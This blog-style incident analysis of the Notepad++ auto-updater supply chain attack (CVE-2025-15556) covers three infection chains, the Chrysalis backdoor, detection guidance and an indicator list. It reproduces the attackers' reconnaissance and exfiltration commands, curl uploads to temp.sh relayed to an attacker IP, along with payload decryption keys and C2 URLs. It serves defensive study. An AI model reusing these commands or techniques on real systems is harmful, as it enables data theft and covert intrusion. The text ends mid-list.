---
title: "They Never Touched the Code: Inside the Notepad++ Supply Chain Attack"
date: 2026-04-22
draft: false
tags: ["Supply Chain Attack" , "Malware"]
image: "/thumbnails/notepad-supplychain.png"
description: "How a hosting provider compromise turned Notepad++'s auto-updater into a malware delivery pipeline."
---

Supply chain attacks have become one of the more frustrating categories to defend against not because they are technically unprecedented, but because they weaponize the one thing defenders cannot easily strip away: trust. Every organization that told its users to keep their software updated, every IT policy that mandated patching, inadvertently built the delivery mechanism these attacks rely on. CVE-2025-15556 is a clean example of that. The Notepad++ updater was not broken in any exotic way; it simply trusted the server it was talking to, and that server got compromised. What followed was a four-month, three-chain operation by a Chinese state-sponsored group that rotated its tooling monthly, fingerprinted victims before deploying payloads, and introduced a previously undocumented backdoor before anyone noticed anything was wrong.

I've been spending time sharpening my incident response and threat analysis skills, and supply chain attacks kept coming up as a category worth sitting with properly not just reading about at a surface level. Each incident in this space tends to have its own unique entry point: SolarWinds came through a build pipeline, XZ Utils through a social engineering play on a maintainer, and this one through a shared hosting compromise against an open-source project. The vector is never quite the same. That variety is exactly what makes them worth studying one by one. This is my deep-dive on CVE-2025-15556 ;the vulnerability, the infrastructure compromise behind it, the three infection chains, and what defenders can actually do with it.


## CVE Details

| Field                          | Value                                                                                                                 |
| ------------------------------ | --------------------------------------------------------------------------------------------------------------------- |
| **CVE ID**                     | CVE-2025-15556                                                                                                        |
| **Published**                  | 2026-02-03                                                                                                            |
| **Last Updated**               | 2026-02-13                                                                                                            |
| **Affected Component**         | Notepad++ < 8.8.9 - WinGUp auto-updater                                                                               |
| **Vulnerability Class**        | CWE-494 - Download of Code Without Integrity Check                                                                    |
| **CVSS v3.1 Score**            | 7.5 High - `AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H`                                                                     |
| **CVSS v4.0 Score**            | 7.7 High - `AV:N/AC:H/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H`                                                                  |
| **CISA KEV**                   | Listed - Known Exploited Vulnerability                                                                                |
| **Patch**                      | Notepad++ v8.8.9 (cert + installer signature verification)                                                            |
| **Full Remediation**           | Notepad++ v8.9.2 (signed XML manifest enforcement)                                                                    |
| **CAPEC**                      | CAPEC-184 (Software Integrity Attack), CAPEC-185 (Malicious Software Download), CAPEC-186 (Malicious Software Update) |
| **Threat Actor**               | Lotus Blossom (Chinese state-sponsored APT, active since 2009)                                                        |
| **Active Exploitation Window** | June 2025 – November 10, 2025 (infrastructure access retained until December 2, 2025)                                 |
| **Vulnerability Disclosed**    | December 9, 2025                                                                                                      |
| **Incidents Made Public**      | February 2, 2026                                                                                                      |


## Background

Notepad++ is a widely deployed text editor among developers and power users on Windows. Its auto-update mechanism, the **WinGUp (Windows Generic Updater)** component, handles update discovery and installation. When a user triggers or accepts an update, `GUP.exe` queries the Notepad++ update server for a download URL, retrieves the installer from that URL, and executes it.

For all versions prior to 8.8.9, WinGUp performed no cryptographic verification at any point in this flow. The update manifest XML was not signed. The downloaded installer binary was not hash-checked. No certificate validation was performed. The updater executed whatever binary the server returned.

This is a textbook implementation of [CWE-494](https://cwe.mitre.org/data/definitions/494.html) .  The entire security posture of the update mechanism depended on the integrity of the server infrastructure; a single point of failure that was successfully compromised.


## Incident Overview

Between June and December 2025, a Chinese state-sponsored threat actor known as **Lotus Blossom** compromised the shared hosting infrastructure serving `notepad-plus-plus.org` and used that access to intercept Notepad++ update traffic, substituting legitimate update packages with malware-laden NSIS installers.

The attack was not a mass-exploitation campaign. Attackers filtered victims by strategic value, ultimately targeting approximately a dozen machines across government, financial, and IT sector organisations in Vietnam, the Philippines, El Salvador, and Australia. The malicious update payload, delivery mechanism, and C2 infrastructure rotated three times over four months; a deliberate operational security practice.

The campaign delivered Cobalt Strike Beacon across all three chains and introduced a previously undocumented custom backdoor, **Chrysalis**, in the third and final chain attributed to Lotus Blossom by both Kaspersky GReAT and Rapid7.


## Initial Assessment

**Key Facts from Initial Review:**

- The vulnerability is not a code defect in Notepad++ itself ; it is an absent security control in the update pipeline
- The root compromise occurred at the hosting provider level, not through any flaw in Notepad++
- Attackers maintained server-level access June–September 2025, then retained credential-based traffic redirection capability through December 2, 2025
- Active malicious payload delivery was observed July–November 2025
- The attack was selective: the majority of Notepad++ users were never exposed; only high-value targets received malicious updates
- Three independent infection chains were identified, each deployed approximately one month apart with significant variation in TTPs

**Threat Actor Profile - Lotus Blossom:**

- Also tracked as: Elise, Spring Dragon, ST Group
- Active since 2009
- Primary motivation: espionage
- Geographic focus: Southeast Asia (Vietnam, Philippines, Indonesia, Thailand), recent expansion to Central America
- Sectors targeted: government, defence, telecom, aviation, critical infrastructure, media
- Known for long-dwell, targeted operations with custom tooling

**Key Terms:**

- `WinGUp` - Windows Generic Updater, the auto-update component bundled with Notepad++
- `GUP.exe` - the WinGUp process executable, legitimate parent of update delivery
- `NSIS` - Nullsoft Scriptable Install System, a legitimate installer framework abused by multiple Chinese APT groups for payload staging
- `Chrysalis` - custom backdoor developed and deployed by Lotus Blossom, first documented in this campaign
- `Cobalt Strike` - commercial red team C2 framework widely abused by threat actors; beacon payloads used throughout all three chains
- `DLL Sideloading` - technique where a malicious DLL is placed alongside a legitimate executable that loads it by name, inheriting the legitimate process's trust


## Phase 1: Infrastructure Compromise

### The Hosting Provider Breach

The supply chain attack begins not with a CVE exploit but with a server intrusion. In **June 2025**, Lotus Blossom gained access to the shared hosting server running `notepad-plus-plus.org`. The exact intrusion vector remains unconfirmed; the hosting provider's own investigation identified suspicious log entries consistent with compromise but did not recover a specific initial access artifact.

The hosting provider's post-incident statement confirmed:

- The shared hosting server was under attacker control from **June 2025 until September 2, 2025**, when scheduled maintenance (kernel and firmware update) terminated attacker access
- After losing direct server access, attackers retained **credentials for internal services** on that server until **December 2, 2025**, which they used to redirect traffic from the Notepad++ update endpoint to attacker-controlled servers
- No other tenants on the same shared hosting server were targeted; attackers specifically searched for the `notepad-plus-plus.org` domain
- The attackers had prior knowledge of the insufficient update verification controls in Notepad++ and deliberately targeted that endpoint

The specific endpoint exploited was:

```
https://notepad-plus-plus.org/update/getDownloadUrl.php
```

Victims whose update traffic was redirected received a modified response pointing to an attacker-controlled download URL rather than the legitimate Notepad++ release. Because WinGUp performed no verification, `GUP.exe` downloaded and executed whatever binary that URL served.

### Why This Worked

The attack exploited two compounding weaknesses simultaneously:

1. **CWE-494 in WinGUp** - no integrity verification on downloaded update content
2. **Shared hosting infrastructure** - the Notepad++ domain shared a server with other tenants, reducing the overall security baseline of the hosting environment

Neither weakness alone was catastrophic. Together, they created a pathway from a hosting provider compromise directly to arbitrary code execution on end-user machines.

**Key Finding:** The Notepad++ codebase itself was never modified. The attack operated entirely at the infrastructure and delivery layer. This is a pure supply chain attack ; the software was trustworthy; the delivery mechanism was not.


## Phase 2: Attack Chain Analysis

Kaspersky GReAT telemetry identified three distinct infection chains deployed between July and October 2025. Each chain was active for approximately four to six weeks before the attackers rotated to the next. The rotation pattern demonstrates operational discipline ; the attackers were actively managing detection risk and adapting their tooling.

### Timeline of Active Deployment

| Period | Chain | Primary Payload | C2 Domain |
|---|---|---|---|
| Late July – Early August 2025 | Chain 1 | ProShow Exploit → Cobalt Strike | `45.77.31[.]210`, `cdncheck.it[.]com` |
| Mid–Late September 2025 | Chain 2 | Lua Interpreter → Cobalt Strike | `cdncheck.it[.]com`, `safe-dns.it[.]com` |
| Early–Late October 2025 | Chain 3 | DLL Sideload → Chrysalis Backdoor | `api.skycloudcenter[.]com` |
| Mid–Late October 2025 | Chain 2 (resumed) | Lua Interpreter → Cobalt Strike | `safe-dns.it[.]com`, `self-dns.it[.]com` |

All malicious `update.exe` files were NSIS installers ; consistent with known Chinese APT tradecraft for initial payload staging.


### Chain 1 - Late July to Early August 2025: ProShow Exploit + Cobalt Strike

**Delivery URL:** `http://45.76.155[.]202/update/update.exe`

**Stage 1 - Victim Fingerprinting:**

On execution, the NSIS installer (~1 MB) immediately ran reconnaissance and exfiltrated results before doing anything else:

```batch
cmd /c whoami&&tasklist > 1.txt
curl.exe -F "file=@1.txt" -s https://temp.sh/upload
curl.exe --user-agent "https://temp.sh/[uploaded_url]/1.txt" -s http://45.76.155[.]202
```

The approach is deliberate: victim system information (current user, running processes) is uploaded to `temp.sh`  (a legitimate file hosting service) and the resulting URL is passed to the attacker's C2 server embedded in the HTTP `User-Agent` header. This uses a Living-off-the-Land C2 (LOLC2) pattern. A proxy logging HTTP requests would see outbound traffic to `temp.sh` (benign appearance) and an unusual User-Agent but no obvious C2 beacon. The attacker received the file URL and could retrieve victim data from `temp.sh` without making any further direct connection to the victim.

This two-step exfil design suggests the recon data was reviewed before deploying the second stage, consistent with the selective targeting observed across the campaign.

**Stage 2 - ProShow Vulnerability Exploitation:**

Rather than DLL sideloading (heavily scrutinised by this point), the attackers chose a lesser-known technique: exploiting an old vulnerability in **ProShow software** from the early 2010s.

Files dropped to `%appdata%\ProShow\`:

| File | SHA1 | Type |
|---|---|---|
| `ProShow.exe` | `defb05d5a91e4920c9e22de2d81c5dc9b95a9a7c` | Legitimate ProShow binary |
| `defscr` | `259cd3542dea998c57f67ffdd4543ab836e3d2a3` | Legitimate ProShow asset |
| `if.dnt` | `46654a7ad6bc809b623c51938954de48e27a5618` | Legitimate ProShow asset |
| `proshow_e.bmp` | `9df6ecc47b192260826c247bf8d40384aa6e6fd6` | Legitimate ProShow asset |
| `load` | `06a6a5a39193075734a32e0235bde0e979c27228` | **Malicious exploit payload** |

All files in the directory are legitimate except `load`. This is intentional; a forensic analyst or AV scanning the directory sees mostly known-good software. The `load` file contained two shellcodes:

- **Shellcode at file start:** Meaningless instructions; deliberate misdirection. Placed to waste analyst time and confuse automated analysis tools expecting shellcode at a standard offset.
- **Shellcode in file middle:** The real payload. Triggered when `ProShow.exe` executes via the exploited vulnerability.

The second shellcode decrypted a **Metasploit downloader** that fetched a **Cobalt Strike Beacon shellcode** from the attacker's server:

```
GET https://45.77.31[.]210/users/admin
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/138.0.0.0
```

Cobalt Strike Beacon C2 communications:
```
GET  https://45.77.31[.]210/api/update/v1
POST https://45.77.31[.]210/api/FileUpload/submit
```

In early August 2025, the chain repeated with the C2 shifted to `cdncheck.it[.]com`. The domain name is engineered to blend into network logs - it reads as a CDN health-check endpoint. After early August, Chain 1 went dark.


### Chain 2 - Mid-September to Late October 2025: Lua Interpreter Shellcode Loader + Cobalt Strike

After a ~45-day gap, a second chain appeared using the same delivery URL but a radically different execution mechanism.

**Installer size:** ~140 KB (down from ~1 MB, stripped to essentials only)

**Stage 1 - Expanded Reconnaissance:**

```batch
cmd /c "whoami&&tasklist&&systeminfo&&netstat -ano" > a.txt
curl.exe -F "file=@a.txt" -s https://temp.sh/upload
curl.exe --user-agent "[temp.sh_url]" -s http://45.76.155[.]202/list
```

The recon scope expanded significantly: full `systeminfo` output and active network connections (`netstat -ano`) added to the previous user/process enumeration. Attackers were building a more complete picture of each victim environment before proceeding.

**Stage 2 - Lua Interpreter as Shellcode Runner:**

Files dropped to `%APPDATA%\Adobe\Scripts\`:

| File | SHA1 | Type |
|---|---|---|
| `lua5.1.dll` | `2ab0758dda4e71aee6f4c8e4c0265a796518f07d` | Legitimate Lua library |
| `script.exe` | `bf996a709835c0c16cce1015e6d44fc95e08a38a` | Legitimate Lua interpreter |
| `alien.dll` | `6444dab57d93ce987c22da66b3706d5d7fc226da` | Legitimate Lua DLL |
| `alien.ini` | `ca4b6fe0c69472cd3d63b212eb805b7f65710d33` | **Compiled malicious Lua script** |

Launch command:
```
%APPDATA%\Adobe\Scripts\script.exe %APPDATA%\Adobe\Scripts\alien.ini
```

This invokes a legitimate Lua interpreter against a compiled Lua script (`alien.ini`) that does one thing: allocates executable memory, places shellcode inside it, and executes it via `EnumWindowStationsW`. Every file in the directory except `alien.ini` is a known-good binary. The technique abuses a legitimate scripting runtime to execute arbitrary shellcode without dropping a standalone executable.

The shellcode was again a Metasploit downloader fetching Cobalt Strike Beacon from `cdncheck.it[.]com/users/admin`.

**Late-September Variant:**

By late September 2025 the attackers made two modifications:

1. Split the single recon command into individual `cmd` invocations (each appending to `a.txt` separately) likely to evade process-tree command-line detection rules looking for the chained `&&` pattern
2. Shifted C2 to `safe-dns.it[.]com` a domain constructed to resemble DNS resolver infrastructure

Chain 2 resumed in mid-October 2025 from a new delivery IP (`95.179.213[.]0`) with the same payload structure. By late October the delivery filename rotated between `update.exe`, `install.exe`, and `AutoUpdater.exe` from the same IP.


### Chain 3 - October 2025: DLL Sideloading + Chrysalis Backdoor

The third chain represented a significant capability upgrade. The recon heartbeat was dropped entirely. The final payload was no longer Cobalt Strike; it was a custom, previously undocumented implant.

**Delivery URL:** `http://45.32.144[.]255/update/update.exe`

Files dropped to `%appdata%\Bluetooth\` (directory set to **HIDDEN**):

| File | SHA1 | Type |
|---|---|---|
| `BluetoothService.exe` | `21a942273c14e4b9d3faa58e4de1fd4d5014a1ed` | Legitimate Bitdefender Submission Wizard |
| `log.dll` | `f7910d943a013eede24ac89d6388c1b98f8b3717` | **Malicious sideloaded DLL** |
| `BluetoothService` | `7e0790226ea461bcc9ecd4be3c315ace41e1c122` | **Encrypted shellcode (Chrysalis)** |

The directory name (`Bluetooth`), the executable name (`BluetoothService.exe`), and the payload filename (`BluetoothService`) are all chosen to blend into a standard Windows environment. A `BluetoothService.exe` process appearing in Task Manager does not immediately raise suspicion.

The DLL sideloading chain, using a legitimate vendor binary to load an attacker-supplied DLL , is a commonly observed Chinese APT technique and is the primary indicator linking Chain 3 to the same actor family.


## Phase 3: Malware Analysis - The Chrysalis Backdoor

Rapid7 incident response, working independently from Kaspersky, recovered and fully reversed the Chrysalis backdoor. This is the first public documentation of this implant.

### Loader: `log.dll`

`log.dll` exports two functions called by the sideloaded Bitdefender binary:

**`LogInit`:** Loads the `BluetoothService` encrypted shellcode file into the process memory.

**`LogWrite`:** Decrypts the shellcode and transfers execution to it.

The decryption routine uses a **custom Linear Congruential Generator (LCG)** with constants `0x19660D` and `0x3C6EF35F` - not a standard cryptographic API call. This is deliberate: standard crypto API calls (CryptDecrypt, AES, etc.) are common detection targets. An LCG-based custom cipher avoids API-level detection.

API resolution throughout `log.dll` uses **FNV-1a hashing** with a MurmurHash-style avalanche finalizer and salted target hashes. No API names appear in plaintext in the binary all imports are resolved at runtime by hash comparison, making static import analysis ineffective.

### Chrysalis Main Module

After `log.dll` decrypts and executes the shellcode, the shellcode decrypts the Chrysalis main module using a compound XOR cipher:

```c
char XORKey[8] = "gQ2JR&9;";
// XOR operation applied 5 times across the payload buffer
// Each byte: x = (x + k) ^ k - k  for key byte k
```

The main module is a **reflective PE-like structure**; it performs its own MSVC CRT initialisation before running, allowing it to operate as a fully functional executable loaded entirely in memory without touching disk as a PE file.

**DLL loading sequence (dynamic, all names constructed at runtime):**
```
oleaut32.dll → advapi32.dll → shlwapi.dll → user32.dll →
wininet.dll → ole32.dll → shell32.dll
```

DLL names are not stored as plaintext strings. They are reconstructed at runtime using a **position-dependent character obfuscation scheme**; identical characters encode differently depending on their position in the string. This defeats simple string-based detection: no recognisable DLL names appear in the binary.

The main module uses a second, more sophisticated API hashing routine: multi-stage arithmetic mixing with MurmurHash-style constants, processing API names in 4-byte blocks. Both the loader and the main module implement independent API hashing schemes with different algorithms; analysts reversing the loader's method cannot directly apply it to the main module.

### Configuration Decryption

The Chrysalis configuration is stored in the `BluetoothService` encrypted shellcode file at offset `0x30808`, size `0x980`. Encryption: **RC4** with key `qwhvb^435h&*7`.

Decrypted configuration:

| Field | Value |
|---|---|
| **C2 URL** | `https://api.skycloudcenter[.]com/a/chat/s/70521ddf-a2ef-4adf-9cf0-6d8e24aaa821` |
| **Module Name** | `BluetoothService` |
| **User Agent** | `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.4044.92 Safari/537.36` |

**C2 URL Analysis:** The path format `/a/chat/s/{GUID}` is identical to the **DeepSeek API chat endpoint structure**. The actor deliberately mimicked DeepSeek API traffic to make C2 communications appear legitimate in network monitoring tools. `api.skycloudcenter[.]com` resolved to `61.4.102.97`  geolocated to Malaysia. No other known malware family was observed communicating with this IP and URL at time of publication.

### Persistence Mechanism

Chrysalis evaluates command-line arguments on execution to determine its operating mode:

- **No arguments:** Install persistence via Windows service creation (primary)
- **Fallback:** Registry `Run` key persistence
- **>2 arguments:** Exit silently

The service creation method is preferred ; services run at SYSTEM or LocalService depending on configuration, survive reboots, and do not appear in the user-visible startup entries most end users check.

### Cobalt Strike Beacon - Cross-Chain Characteristics

Across all three chains, the Cobalt Strike Beacon payloads share consistent characteristics that confirm a single operator:

- All Beacons loaded through a Metasploit downloader shellcode with URL pattern `[C2_domain]/users/admin`
- All Beacon configurations encrypted with XOR key **`CRAZY`**
- POST callback URLs consistently follow the pattern `/api/FileUpload/submit`
- Rapid7 additionally identified a Beacon (separate from Kaspersky's findings) in `C:\ProgramData\USOShared\` on an incident-response engagement, with C2 at `api.wiresguard[.]com` same structural patterns confirmed


## Phase 4: Attribution

### Threat Actor: Lotus Blossom

Attribution confidence: **HIGH** - multiple independent indicators across both Kaspersky GReAT and Rapid7 investigations converge on Lotus Blossom.

**Attribution Indicators:**

| Indicator                                                    | Evidence                                                                                                                                                         |
| ------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| DLL sideloading via legitimate vendor binary                 | Standard Lotus Blossom / Chinese APT tradecraft                                                                                                                  |
| NSIS installer for initial payload staging                   | Consistent with documented Chinese APT delivery methods                                                                                                          |
| Selective, espionage-motivated targeting                     | Government, financial, IT sectors in Southeast Asia - Lotus Blossom primary target profile                                                                       |
| Custom backdoor (Chrysalis) with sophisticated anti-analysis | Consistent with group's known capability level                                                                                                                   |
| C2 URL mimicking commercial API (DeepSeek)                   | Evasion technique consistent with advanced persistent threat operations                                                                                          |
| Geographic victim distribution                               | Philippines (government), Vietnam (individuals, IT), El Salvador (financial) - aligns with Lotus Blossom's historical Southeast Asia / Central America targeting |

**Rapid7 Attribution Note:** Rapid7's binary-level analysis of the Chrysalis loader (`log.dll`) and the associated execution chain confirmed attribution to Lotus Blossom through comparison with previously documented Lotus Blossom tooling and TTPs. The campaign is tracked internally by Rapid7 under their Lotus Blossom reporting.

**Motivation:** Espionage. The targeting profile - government organisations, financial entities, IT service providers in strategically relevant geographies - is consistent with state-directed intelligence collection, not financial crime.

### Attack Timeline

| Timestamp | Event |
|---|---|
| **June 2025** | Hosting provider shared server compromised by Lotus Blossom |
| **Late July 2025** | First malicious Notepad++ update observed (Chain 1). Delivered to victim in Vietnam |
| **Early August 2025** | Chain 1 continues with C2 shifted to `cdncheck.it[.]com`. Chain 1 goes dark |
| **September 2, 2025** | Hosting provider kernel/firmware maintenance — attackers lose direct server access |
| **Mid-September 2025** | Chain 2 deployed. Expanded recon, Lua-based shellcode loader |
| **Late September 2025** | Chain 2 variant: split recon commands, C2 shifts to `safe-dns.it[.]com` |
| **Early October 2025** | Chain 3 deployed from new IP `45.32.144[.]255`. Chrysalis backdoor introduced |
| **Mid-October 2025** | Chain 2 resumed from `95.179.213[.]0` |
| **Late October 2025** | Delivery filenames rotate (`install.exe`, `AutoUpdater.exe`). Last payload deployment observed |
| **November 10, 2025** | Attack activity ceases per external researcher analysis |
| **December 2, 2025** | Hosting provider rotates all credentials, blocking remaining attacker infrastructure access |
| **December 9, 2025** | CVE-2025-15556 publicly disclosed |
| **February 2, 2026** | Notepad++ publishes incident statement. Rapid7 publishes Chrysalis analysis |
| **February 3, 2026** | Kaspersky GReAT publishes full IoC report with three chain analysis |
| **February 5, 2026** | Notepad++ publishes clarification, confirms hosting provider IoC data |

### Confirmed Victims

| Victim Type | Location |
|---|---|
| Individuals (3) | Vietnam, El Salvador, Australia |
| Government organisation | Philippines |
| Financial organisation | El Salvador |
| IT service provider | Vietnam |


## Phase 5: Impact Assessment

### Confidentiality
Post-compromise access via Cobalt Strike Beacon grants full interactive control over victim systems. The attacker had the capability to access, read, and exfiltrate any data accessible to the logged-in user. Chrysalis, with its persistence and C2 capability, provided sustained access.

### Integrity
Arbitrary code execution with user-level privileges. If the user ran Notepad++ with elevated privileges, the malicious installer inherited those privileges.

### Availability
No destructive payloads observed in this campaign. Lotus Blossom's mission is intelligence collection, not disruption.

### Scope Limitation
The attack was genuinely selective. The hosting provider confirmed no other tenants were targeted. Kaspersky confirmed only approximately a dozen victim machines were identified across the entire four-month campaign. The overwhelming majority of Notepad++ users , the tool has tens of millions of downloads, were never served a malicious update.

### Root Cause Summary

| #   | Root Cause                                                                              | Control Gap                                                                     |
| --- | --------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------- |
| 1   | WinGUp downloaded and executed update installers without signature or hash verification | CWE-494 - no update integrity validation implemented                            |
| 2   | Notepad++ domain hosted on shared hosting with insufficient tenant isolation            | Hosting infrastructure security - single server compromise affected the domain  |
| 3   | No XML manifest signing in the update metadata channel                                  | Unsigned update manifests allowed redirect to attacker-controlled download URLs |


## Detection Guidance

### Immediate Indicators to Hunt

**Process Tree Anomalies:**

Any execution of `GUP.exe` (the WinGUp process) that spawns a child process other than a signed Notepad++ installer should be treated as a high-confidence indicator of compromise. Normal WinGUp behaviour produces no child processes beyond the verified installer.

Specific process tree to alert on:
```
notepad++.exe
  └─ GUP.exe
       └─ update.exe  ← NSIS installer (unsigned or unrecognised)
            └─ cmd.exe / ProShow.exe / script.exe
```

**NSIS Runtime Artefact:**

All three chains used NSIS installers. NSIS creates a temporary directory at runtime:
```
%localappdata%\Temp\ns.tmp\
```
Detection of this path being created by a process spawned from `GUP.exe` is a high-fidelity indicator.

**Reconnaissance Command Sequences:**

Alert on any instance of `GUP.exe` or its children spawning:
```
whoami
tasklist
systeminfo
netstat -ano
```
Individually these are common admin tools. In rapid succession as children of `GUP.exe`, they are definitive indicators of Chain 1 or Chain 2 payload execution.

**LOLC2 - temp.sh DNS Resolution:**

`temp.sh` is a legitimate file hosting service with no expected corporate presence. DNS resolution of `temp.sh` from an endpoint that runs Notepad++ should trigger investigation. More specifically, hunt for HTTP/HTTPS requests where the `User-Agent` header contains a `temp.sh` URL - this is the exfiltration mechanism used in Chain 1 and Chain 2.

Sigma rule concept:
```yaml
detection:
  selection:
    http.useragent|contains: 'temp.sh/'
  condition: selection
```

**Malicious File Paths:**

```
%appdata%\ProShow\load
%appdata%\Adobe\Scripts\alien.ini
%appdata%\Bluetooth\BluetoothService
%appdata%\Bluetooth\log.dll
```
None of these paths are created by any legitimate software. Any file creation event at these paths is a confirmed indicator.

**DLL Sideloading - BluetoothService.exe:**

A process named `BluetoothService.exe` executing outside of a Bitdefender installation directory (`C:\Program Files\Bitdefender\` or similar) and loading `log.dll` is a confirmed Chain 3 indicator.

**Cobalt Strike Beacon Patterns:**

- XOR decryption key `CRAZY` used in all observed beacon configurations
- C2 POST callback URL pattern: `*/api/FileUpload/submit`
- C2 GET callback URL pattern: `*/api/update/v1` or `*/api/getInfo/v1`
- Metasploit downloader URL pattern: `*/users/admin`

**Chrysalis C2 Traffic:**

Any HTTPS connection to a URL matching the pattern `/a/chat/s/{GUID}` from a non-browser process should be investigated. Specifically:
```
api.skycloudcenter[.]com
61.4.102.97
```

**Registry Persistence:**

Alert on `Run` key modifications from processes in `%APPDATA%\Bluetooth\` or `%APPDATA%\Adobe\Scripts\`:
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```


## Key Takeaways

**What This Investigation Surfaces:**

- Supply chain attacks do not require compromising the software itself. Compromising the delivery infrastructure is sufficient - and in many cases easier. The Notepad++ codebase was never touched.
- Update mechanisms that lack cryptographic verification are implicit trust relationships with whoever controls the server. That trust must be earned by the server, not assumed.
- Operational rotation of TTPs , changing infection chains monthly , significantly increases the cost of detection and attribution. Three chains, three different shellcode loaders, two different final payloads. Defenders relying on specific IoCs from Chain 1 would miss Chains 2 and 3 entirely.
- LOLC2 using legitimate file-hosting services (`temp.sh`) effectively blends exfiltration into normal web traffic. URL-in-User-Agent is an unusual enough pattern that hunting for it is tractable.
- Selective targeting is a detection challenge. When a campaign affects ~12 machines globally over 4 months, no automated telemetry at scale will surface it. This was found through manual IR and retrospective threat hunting.
- The DeepSeek API URL mimicry in Chrysalis is a preview of a growing defensive problem: as AI service traffic normalises in corporate environments, threat actors will increasingly use those URL structures for C2 masquerade.

**Red Flags for Similar Attacks:**

- `GUP.exe` spawning any child process other than a signed Notepad++ installer
- NSIS installer executed by a process other than a user-initiated download
- `temp.sh` DNS queries or HTTP traffic with `temp.sh` URLs in the User-Agent header
- Legitimate software binaries (ProShow, Bitdefender tools, Lua interpreter) appearing in `%APPDATA%` subdirectories alongside single-character or ambiguously named payload files
- Cobalt Strike beacons using `/users/admin` as the initial staging endpoint
- C2 domains constructed to resemble infrastructure services: `cdncheck`, `safe-dns`, `self-dns`, `wiresguard`


## IOC Summary

### Network Indicators

**Malicious Update Delivery URLs:**
```
http://45.76.155[.]202/update/update.exe
http://45.32.144[.]255/update/update.exe
http://95.179.213[.]0/update/update.exe
http://95.179.213[.]0/update/install.exe
http://95.179.213[.]0/update/AutoUpdater.exe
```

**Victim Recon Exfil Endpoints:**
```
http://45.76.155[.]202/list
https://self-dns.it[.]com/list
https://temp.sh/upload  (legitimate service — flag DNS resolution, not the domain itself)
```

**Metasploit Downloader → Cobalt Strike Staging:**
```
https://45.77.31[.]210/users/admin
https://cdncheck.it[.]com/users/admin
https://safe-dns.it[.]com/help/Get-Start
https://api.wiresguard[.]com/users/admin  (Rapid7)
```

**Cobalt Strike Beacon C2:**
```
https://45.77.31[.]210/api/update/v1
https://45.77.31[.]210/api/FileUpload/submit
https://cdncheck.it[.]com/api/update/v1
https://cdncheck.it[.]com/api/Metadata/submit
https://cdncheck.it[.]com/api/getInfo/v1
https://cdncheck.it[.]com/api/FileUpload/submit
https://safe-dns.it[.]com/resolve
https://safe-dns.it[.]com/dns-query
http://59.110.7[.]32:8880/uffhxpSy
http://59.110.7[.]32:8880/api/getBasicInfo/v1
http://59.110.7[.]32:8880/api/Metadata/submit
http://124.222.137[.]114:9999/3yZR31VK
http://124.222.137[.]114:9999/api/updateStatus/v1
http://124.222.137[.]114:9999/api/Info/submit
https://api.wiresguard[.]com/update/v1
https://api.wiresguard[.]com/api/FileUpload/submit
```

**Chrysalis Backdoor C2:**
```
https://api.skycloudcenter[.]com/a/chat/s/70521ddf-a2ef-4adf-9cf0-6d8e24aaa821
61.4.102.97  (Malaysia — resolved IP)
```

### File Hashes

**Malicious `update.exe` Installers (SHA1):**
```
8e6e505438c21f3d281e1cc257abdbf7223b7f5a  - Chain 1, late July 2025
90e677d7ff5844407b9c073e3b7e896e078e11cd  - Chain 1, early August 2025
573549869e84544e3ef253bdba79851dcde4963a  — Chain 2, mid-September 2025
13179c8f19fbf3d8473c49983a199e6cb4f318f0  — Chain 2, late September 2025
4c9aac447bf732acc97992290aa7a187b967ee2c  — Chain 2 variant (safe-dns C2)
821c0cafb2aab0f063ef7e313f64313fc81d46cd  — Chain 2 resumed, mid-October 2025
d7ffd7b588880cf61b603346a3557e7cce648c93  — Chain 3, October 2025
```

**Chain 1 Auxiliary Files (SHA1):**
```
06a6a5a39193075734a32e0235bde0e979c27228  — load (ProShow exploit payload)
9c3ba38890ed984a25abb6a094b5dbf052f22fa7  — load (variant)
defb05d5a91e4920c9e22de2d81c5dc9b95a9a7c  — ProShow.exe (legitimate, used as exploit host)
```

**Chain 2 Auxiliary Files (SHA1):**
```
ca4b6fe0c69472cd3d63b212eb805b7f65710d33  — alien.ini (compiled Lua shellcode launcher)
0d0f315fd8cf408a483f8e2dd1e69422629ed9fd  — alien.ini (variant)
2a476cfb85fbf012fdbe63a37642c11afa5cf020  — alien.ini (variant)
6444dab57d93ce987c22da66b3706d5d7fc226da  — alien.dll (legitimate Lua DLL)
2ab0758dda4e71aee6f4c8e4c0265a796518f07d  — lua5.1.dll (legitimate)
bf996a709835c0c16cce1015e6d44fc95e08a38a  — script.exe (legitimate Lua interpreter)
```

**Chain 3 / Chrysalis Files (SHA1 unless noted):**
```
f7910d943a013eede24ac89d6388c1b98f8b3717  — log.dll (Chrysalis loader / malicious sideload DLL)
7e0790226ea461bcc9ecd4be3c315ace41e1c122  — BluetoothService (encrypted Chrysalis shellcode)
21a942273c14e4b9d3faa58e4de1fd4d5014a1ed  — BluetoothService.exe (legitimate Bitdefender binary)
94dffa9de5b665dc51bc36e2693b8a3a0a4cc6b8  — (Rapid7 identified)
73d9d0139eaf89b7df34ceeb60e5f8c7cd2463bf  — (Rapid7 identified)
bd4915b3597942d88f319740a9b803cc51585c4a  — (Rapid7 identified)
c68d09dd50e357fd3de17a70b7724f8949441d77  — (Rapid7 identified)
813ace987a61af909c053607635489ee984534f4  — (Rapid7 identified)
9fbf2195dee991b1e5a727fd51391dcc2d7a4b16  — (Rapid7 identified)
07d2a01e1dc94d59d5ca3bdf0c7848553ae91a51  — (Rapid7 identified)
3090ecf034337857f786084fb14e63354e271c5d  — (Rapid7 identified)
d0662eadbe5ba92acbd3485d8187112543bcfbf5  — (Rapid7 identified)
9c0eff4deeb626730ad6a05c85eb138df48372ce  — (Rapid7 identified)
```

**Chrysalis SHA-256 (Rapid7):**
```
3bdc4c0637591533f1d4198a72a33426c01f69bd2e15ceee547866f65e26b7ad  — log.dll
77bfea78def679aa1117f569a35e8fd1542df21f7e00e27f192c907e61d63a2e  — BluetoothService (shellcode)
2da00de67720f5f13b17e9d985fe70f10f153da60c9ab1086fe58f069a156924  — BluetoothService.exe (Bitdefender binary)
```

### Malicious File Paths
```
%appdata%\ProShow\load
